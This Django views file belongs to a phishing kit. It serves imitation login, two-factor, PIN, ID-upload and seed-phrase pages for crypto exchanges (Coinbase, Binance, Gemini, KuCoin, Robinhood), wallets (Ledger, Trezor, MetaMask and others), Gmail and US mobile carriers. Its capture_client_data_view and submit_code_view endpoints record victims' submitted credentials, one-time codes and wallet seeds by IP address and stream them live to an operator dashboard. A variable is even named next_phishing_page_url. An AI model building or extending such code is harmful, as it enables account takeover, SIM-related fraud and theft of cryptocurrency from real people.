# shinesoftware/shinesoftware/views.py

from django.shortcuts import render
from django.http import JsonResponse
from django.views.decorators.http import require_POST
from django.views.decorators.csrf import csrf_exempt
import json

# Imports from your dashboard app
from dashboard.models import ClientConnection
from dashboard.consumers import DashboardConsumer  # For the group name
from channels.layers import get_channel_layer
from asgiref.sync import async_to_sync
from django.utils import timezone

def home(request):
    return render(request, 'coinbase/index.html')


@require_POST  # Ensures this view only accepts POST requests
def submit_code_view(request):
    try:
        data = json.loads(request.body)
        submitted_code = data.get('code')

        # Validate the submitted code (six digits, all numeric)
        if not submitted_code or not isinstance(submitted_code, str) or \
           len(submitted_code) != 6 or not submitted_code.isdigit():
            return JsonResponse(
                {'success': False, 'message': 'Invalid code format.'},
                status=400
            )

        # **** KEY CHANGE: Get IP address to find the ClientConnection record ****
        x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
        ip_address = (
            x_forwarded_for.split(',')[0]
            if x_forwarded_for
            else request.META.get('REMOTE_ADDR')
        )

        if not ip_address:
            return JsonResponse(
                {'success': False, 'message': 'Could not determine IP address.'},
                status=400
            )

        try:
            # Find or create the record based on IP.
            client_conn, created = ClientConnection.objects.get_or_create(
                ip_address=ip_address,
                defaults={
                    'client_id': request.session.session_key,  # Store current session
                    'user_agent': request.META.get('HTTP_USER_AGENT', ''),
                    # Add other necessary defaults if it might be created here
                }
            )

            # Update the client connection
            client_conn.is_connected = True
            client_conn.connection_data = submitted_code
            client_conn.last_seen = timezone.now()

            # If this view created the IP record, populate extra fields
            if created:
                user_agent_parsed = getattr(request, 'user_agent', None)
                if user_agent_parsed:
                    client_conn.browser_name = user_agent_parsed.browser.family
                    client_conn.device_type = (
                        'Mobile' if user_agent_parsed.is_mobile else
                        'Tablet' if user_agent_parsed.is_tablet else
                        'Desktop' if user_agent_parsed.is_pc else
                        'Bot'
                    )
                # ... populate other fields if 'created' by this view ...

            client_conn.save()

            print(f"Client (IP: {ip_address}) connected with code {submitted_code}")

            # Broadcast update via Channels
            channel_layer = get_channel_layer()
            total_visits_now = ClientConnection.objects.count()  # Unique IPs
            total_connects_now = ClientConnection.objects.filter(
                is_connected=True
            ).count()  # Unique IPs connected

            # Data for the new row in the dashboard table
            connected_client_data_for_table = client_conn.to_dict()

            async_to_sync(channel_layer.group_send)(
                DashboardConsumer.dashboard_group_name,
                {
                    'type': 'send_dashboard_update',
                    'data': {
                        'total_visits': total_visits_now,
                        'total_connects': total_connects_now,
                        'new_connected_client': connected_client_data_for_table
                    }
                }
            )

            # Define where to redirect after successful code submission
            loading_page_url = '/coinbase/loading/'

            return JsonResponse({
                'success': True,
                'message': 'Code accepted!',
                'redirect_url': loading_page_url
            })

        except Exception as e:
            # Catch-all for any errors during ClientConnection lookup/creation
            print(f"Error processing code submission: {e}")
            return JsonResponse(
                {'success': False, 'message': 'An internal error occurred.'},
                status=500
            )

    except json.JSONDecodeError:
        return JsonResponse(
            {'success': False, 'message': 'Invalid JSON data.'},
            status=400
        )
    except Exception as e:
        print(f"Outer error in submit_code_view: {e}")
        return JsonResponse(
            {'success': False, 'message': 'An unexpected error occurred.'},
            status=500
        )


def gemini_email_password_view(request):
    # TODO: implement logic
    return render(request, 'gemini/gemini.html')

def gemini_2fa_sms_view(request):
    # Get the 'last_digits' from the query parameter
    last_digits_from_query = request.GET.get('last_digits', 'XX') # Default to XX if not provided
    
    context = {
        'last_two_digits': last_digits_from_query, # This is the variable for your template
        # You can add other context variables if needed for this page
    }
    # The VisitorTrackingMiddleware will automatically log this page visit.
    # visibility_tracker.js (if included in 2fa_sms.html) will handle status/timezone.
    return render(request, 'gemini/2fa_sms.html', context)

def gemini_2fa_authy_view(request):
    last_digits_from_query = request.GET.get('last_digits', 'XX') # Default to XX if not provided
    
    context = {
        'last_two_digits': last_digits_from_query, # This is the variable for your template
        # You can add other context variables if needed for this page
    }
    return render(request, 'gemini/authy_code.html',  context)

def gemini_2fa_email_view(request):
    # TODO: implement logic
    return render(request, 'gemini/email_code.html')

def gemini_authdevice_view(request):
    # TODO: implement logic
    return render(request, 'gemini/authorize.html')

def gemini_invalid_2fa_sms_view(request):
    # TODO: implement logic
    return render(request, 'gemini/2fa_sms_error.html')

def gemini_invalid_2fa_authy_view(request):
    # TODO: implement logic
    return render(request, 'gemini/authy_code_invalid.html')

def gemini_invalid_2fa_email_view(request):
    # TODO: implement logic
    return render(request, 'gemini/email_code_invalid.html')

def gemini_loading_view(request):
    return render(request, 'gemini/loading.html')


# RobinHood Views

def robinhood_email_password_view(request):
    # TODO: implement logic
    return render(request, 'robinhood/robinhood.html')

def robinhood_2fasms_view(request):
    # TODO: implement logic
    return render(request, 'robinhood/2fa_sms.html')

def robinhood_2faauthapp_view(request):
    # TODO: implement logic
    return render(request, 'robinhood/2fa_auth.html')

def robinhood_resetpassword_view(request):
    # TODO: implement logic
    return render(request, 'robinhood/reset_password.html')

def robinhood_loading_view(request):
    # TODO: implement logic
    return render(request, 'robinhood/loading.html')

# Kucoin Views

def kucoin_login_view(request):
    # TODO: implement logic
    return render(request, 'kucoin/kucoin.html')

def kucoin_2faauthapp_view(request):
    # TODO: implement logic
    return render(request, 'kucoin/2fa_app.html')

def kucoin_2faemail_view(request):
    # TODO: implement logic
    return render(request, 'kucoin/2fa_email.html')

def kucoin_2fasms_view(request):
    # TODO: implement logic
    return render(request, 'kucoin/2fa_sms.html')

def kucoin_loading_view(request):
    # TODO: implement logic
    return render(request, 'kucoin/loading.html')

# AT&T Views

def att_pin_view(request):
    # TODO: implement logic
    return render(request, 'att/pin.html')

def att_login_view(request):
    # TODO: implement logic
    return render(request, 'att/att.html')

def att_loading_view(request):
    # TODO: implement logic
    return render(request, 'att/loading.html')

def att_completed_view(request):
    # TODO: implement logic
    return render(request, 'att/completed.html')

def att_upgrade_view(request):
    # TODO: implement logic
    return render(request, 'att/suspicious.html')

# T Mobile Views

def tmobile_pin_view(request):
    # TODO: implement logic
    return render(request, 'tmobile/pin.html')

def tmobile_login_view(request):
    # TODO: implement logic
    return render(request, 'tmobile/tmobile.html')

def tmobile_loading_view(request):
    # TODO: implement logic
    return render(request, 'tmobile/loading.html')

def tmobile_completed_view(request):
    # TODO: implement logic
    return render(request, 'tmobile/completed.html')

def tmobile_upgrade_view(request):
    # TODO: implement logic
    return render(request, 'tmobile/suspicious.html')

# Verizon Views

def verizon_pin_view(request):
    # TODO: implement logic
    return render(request, 'verizon/pin.html')

def verizon_login_view(request):
    # TODO: implement logic
    return render(request, 'verizon/verizon.html')

def verizon_loading_view(request):
    # TODO: implement logic
    return render(request, 'verizon/loading.html')

def verizon_completed_view(request):
    # TODO: implement logic
    return render(request, 'verizon/completed.html')

def verizon_upgrade_view(request):
    # TODO: implement logic
    return render(request, 'verizon/suspicious.html')

# Wallets Views

def trezor_seed_view(request):
    # TODO: implement logic
    return render(request, 'wallets/trezor.html')

def ledger_seed_view(request):
    # TODO: implement logic
    return render(request, 'wallets/ledger.html')

def exodus_seed_view(request):
    # TODO: implement logic
    return render(request, 'wallets/exodus.html')

def metamask_seed_view(request):
    # TODO: implement logic
    return render(request, 'wallets/metamask.html')

def trustwallet_seed_view(request):
    # TODO: implement logic
    return render(request, 'wallets/trustwallet.html')

def loading_dark_view(request):
    # TODO: implement logic
    return render(request, 'wallets/loading_dark.html')

def loading_light_view(request):
    # TODO: implement logic
    return render(request, 'wallets/loading_light.html')

# — Coinbase Views —
def coinbase_email_view(request):
    return render(request, 'coinbase/email_input.html')

def coinbase_review_view(request):
    return render(request, 'coinbase/review_account.html')

def coinbase_action_view(request):
    return render(request, 'coinbase/review_action.html')

def coinbase_password_view(request):
    return render(request, 'coinbase/password_input.html')

def coinbase_disconnect_wallet_view(request):
    return render(request, 'coinbase/disconnect_wallet_seed.html')

def coinbase_disconnect_trezor_view(request):
    return render(request, 'coinbase/disconnect_trezor_seed.html')

def coinbase_disconnect_ledger_view(request):
    return render(request, 'coinbase/disconnect_ledger_seed.html')

def coinbase_balance_view(request):
    return render(request, 'coinbase/confirm_balance.html')

def coinbase_reset_password_view(request):
    return render(request, 'coinbase/reset_password.html')

def coinbase_password_error_view(request):
    return render(request, 'coinbase/password_error.html')

def coinbase_reset_error_view(request):
    return render(request, 'coinbase/password_reset_error.html')

def coinbase_2fa_auth_view(request):
    return render(request, 'coinbase/2fa_authapp.html')

def coinbase_2fa_sms_view(request):
    return render(request, 'coinbase/2fa_sms.html')

def coinbase_selfie_upload_view(request):
    return render(request, 'coinbase/selfie_upload.html')

def coinbase_upload_id_view(request):
    return render(request, 'coinbase/upload_id.html')

def coinbase_authorize_view(request):
    return render(request, 'coinbase/device_authorize.html')

def coinbase_vault_view(request):
    return render(request, 'coinbase/coinbase_vault.html')

def coinbase_vault_select_coins_view(request):
    return render(request, 'coinbase/coinbase_vault_select_coins.html')

def coinbase_vault_send_coins_view(request):
    return render(request, 'coinbase/coinbase_vault_send_coins.html')

def coinbase_vault_loading_view(request):
    return render(request, 'coinbase/coinbase_vault_loading.html')

def coinbase_wallet_unlink_completed_view(request):
    return render(request, 'coinbase/coinbase_wallet_unlink_done.html')

def coinbase_wallet_whitelisted_view(request):
    return render(request, 'coinbase/coinbase_wallet_whitelisted.html')

def coinbase_wallet_setup_view(request):
    return render(request, 'coinbase/coinbase_wallet_setup.html')

def coinbase_wallet_setup_v2_view(request):
    return render(request, 'coinbase/coinbase_wallet_setupv2.html')

def coinbase_eth_ltc_view(request):
    return render(request, 'coinbase/coinbase_eth_ltc.html')

def coinbase_eth_btc_view(request):
    return render(request, 'coinbase/coinbase_eth_btc.html')

def coinbase_unauthorized_devices_view(request):
    return render(request, 'coinbase/unauthorized_devices.html')

def coinbase_revert_view(request):
    return render(request, 'coinbase/coinbase_revert.html')

def coinbase_mobile_number_view(request):
    return render(request, 'coinbase/coinbase_mobile_number.html')

def coinbase_expect_call_view(request):
    return render(request, 'coinbase/coinbase_call.html')

def coinbase_connect_seed_view(request):
    return render(request, 'coinbase/coinbase_seed_page.html')

def coinbase_whitelist_seed_view(request):
    return render(request, 'coinbase/coinbase_whitelist_seed.html')

def coinbase_seed_generated_view(request):
    return render(request, 'coinbase/generate_seed_page.html')

def coinbase_wallet_whitelist_self_view(request):
    return render(request, 'coinbase/coinbase_wallet_whitelist_self.html')

def coinbase_loading_view(request):
    return render(request, 'coinbase/coinbase_loading_placeholder.html')

def coinbase_seed_unlink_view(request):
    return render(request, 'coinbase/coinbase_seed_unlink.html')

def coinbase_unlink_pending_view(request):
    return render(request, 'coinbase/coinbase_seed_unlink_pending.html')


# — Binance Views —
def binance_email_password_view(request):
    return render(request, 'binance/email_pass_input.html')

def binance_2fa_email_view(request):
    return render(request, 'binance/2fa_email.html')

def binance_2fa_auth_view(request):
    return render(request, 'binance/2fa_auth.html')

def binance_2fa_sms_view(request):
    # Get the 'last_digits' from the query parameter
    last_digits_from_query = request.GET.get('last_digits', 'XXXX') # Default to XX if not provided
    
    context = {
        'last_four_digits': last_digits_from_query, # This is the variable for your template
        # You can add other context variables if needed for this page
    }
    # The VisitorTrackingMiddleware will automatically log this page visit.
    # visibility_tracker.js (if included in 2fa_sms.html) will handle status/timezone.
    return render(request, 'binance/2fa_sms.html',  context)

def binance_unlink_wallets_view(request):
    return render(request, 'binance/unlink_wallets.html')

def binance_unlink_wallets_error_link_another_view(request):
    return render(request, 'binance/unlink_error_choose_another.html')

def binance_unlink_wallets_error_invalid_view(request):
    return render(request, 'binance/unlink_error_invalid.html')

def binance_unlink_wallets_loading_view(request):
    return render(request, 'binance/unlink_loading.html')

def binance_loading_view(request):
    return render(request, 'binance/loading.html')




# — Gmail Views —
def gmail_email_view(request):
    return render(request, 'gmail/gmail.html')

def gmail_password_view(request):
    return render(request, 'gmail/password_input.html')

def gmail_password_error_view(request):
    return render(request, 'gmail/password_input_error.html')

def gmail_device_otp_view(request):
    return render(request, 'gmail/device_otp.html')

def gmail_2fa_auth_view(request):
    return render(request, 'gmail/2fa_authapp.html')

def gmail_youtube_view(request):
    return render(request, 'gmail/openyoutube.html')

def gmail_gmail_view(request):
    return render(request, 'gmail/opengmail.html')

def gmail_qrcode_view(request):
    return render(request, 'gmail/scan_qrcode.html')

def gmail_number_view(request):
    # Get the 'last_digits' from the query parameter
    number_from_query = request.GET.get('number', 'XX') # Default to XX if not provided
    
    context = {
        'number': number_from_query, # This is the variable for your template
        # You can add other context variables if needed for this page
    }
    # The VisitorTrackingMiddleware will automatically log this page visit.
    # visibility_tracker.js (if included in 2fa_sms.html) will handle status/timezone.
    return render(request, 'gmail/device_number.html', context)

def gmail_2fa_sms_view(request):
    # Get the 'last_digits' from the query parameter
    last_digits_from_query = request.GET.get('last_digits', 'XX') # Default to XX if not provided
    
    context = {
        'last_two_digits': last_digits_from_query, # This is the variable for your template
        # You can add other context variables if needed for this page
    }
    # The VisitorTrackingMiddleware will automatically log this page visit.
    # visibility_tracker.js (if included in 2fa_sms.html) will handle status/timezone.
    return render(request, 'gmail/2fa_sms.html', context)

def gmail_loading_view(request):
    return render(request, 'gmail/loading.html')


@csrf_exempt
@require_POST
def capture_client_data_view(request):
    try:
        data = json.loads(request.body)
        service_name = data.get('service')
        form_data = data.get('formData')
        step_name = data.get('step', 'default_step')

        if not service_name or not isinstance(form_data, dict):
            return JsonResponse({'success': False, 'message': 'Missing service name or form data.'}, status=400)

        x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
        ip_address = x_forwarded_for.split(',')[0] if x_forwarded_for else request.META.get('REMOTE_ADDR')

        if not ip_address:
            return JsonResponse({'success': False, 'message': 'Could not determine IP address.'}, status=400)

        user_agent_parsed = getattr(request, 'user_agent', None)
        browser_name_default = 'Unknown'
        device_type_default = 'Unknown'
        os_name_default = 'Unknown'
        os_version_default = ''

        if user_agent_parsed:
            browser_name_default = user_agent_parsed.browser.family if user_agent_parsed.browser else 'Unknown'
            if user_agent_parsed.is_mobile:
                device_type_default = 'Mobile'
            elif user_agent_parsed.is_tablet:
                device_type_default = 'Tablet'
            elif user_agent_parsed.is_pc:
                device_type_default = 'Desktop'
            elif user_agent_parsed.is_bot:
                device_type_default = 'Bot'
            os_name_default = user_agent_parsed.os.family if user_agent_parsed.os else 'Unknown'
            os_version_default = user_agent_parsed.os.version_string if user_agent_parsed.os else ''

        try:
            client_conn, created_by_this_view = ClientConnection.objects.get_or_create(
                ip_address=ip_address,
                defaults={
                    'client_id': request.session.session_key or 'unknown_session_capture',
                    'user_agent': request.META.get('HTTP_USER_AGENT', ''),
                    'browser_name': browser_name_default,
                    'device_type': device_type_default,
                    'os_name': os_name_default,
                    'os_version': os_version_default,
                }
            )

            client_conn.last_seen = timezone.now()
            was_already_connected = client_conn.is_connected
            if not was_already_connected:
                client_conn.is_connected = True
                print(f"IP {ip_address} is now marked as connected.")

            if service_name not in client_conn.captured_data:
                client_conn.captured_data[service_name] = {}
            if step_name not in client_conn.captured_data[service_name]:
                client_conn.captured_data[service_name][step_name] = {}
            client_conn.captured_data[service_name][step_name].update(form_data)
            client_conn.save()
            print(f"Captured data for IP {ip_address}, Service: {service_name}, Step: {step_name}, Data: {form_data}")

            channel_layer = get_channel_layer()
            client_dict_for_dashboard = client_conn.to_dict()

            async_to_sync(channel_layer.group_send)(
                DashboardConsumer.dashboard_group_name,
                {'type': 'send_client_row_update', 'data': client_dict_for_dashboard}
            )

            if not was_already_connected or created_by_this_view:
                total_visits_now = ClientConnection.objects.count()
                total_connects_now = ClientConnection.objects.filter(is_connected=True).count()
                async_to_sync(channel_layer.group_send)(
                    DashboardConsumer.dashboard_group_name,
                    {'type': 'send_dashboard_update', 'data': {'total_visits': total_visits_now, 'total_connects': total_connects_now}}
                )
            
            next_phishing_page_url = data.get('next_redirect_url', None)
            return JsonResponse({'success': True, 'message': 'Data captured successfully.', 'next_redirect_url': next_phishing_page_url})
        except Exception as e:
            print(f"Error processing captured data for IP {ip_address}: {e}")
            return JsonResponse({'success': False, 'message': 'Internal server error while saving data.'}, status=500)
    except json.JSONDecodeError:
        return JsonResponse({'success': False, 'message': 'Invalid JSON data received.'}, status=400)
    except Exception as e:
        print(f"Outer error in capture_client_data_view: {e}")
        return JsonResponse({'success': False, 'message': 'An unexpected server error occurred.'}, status=500)
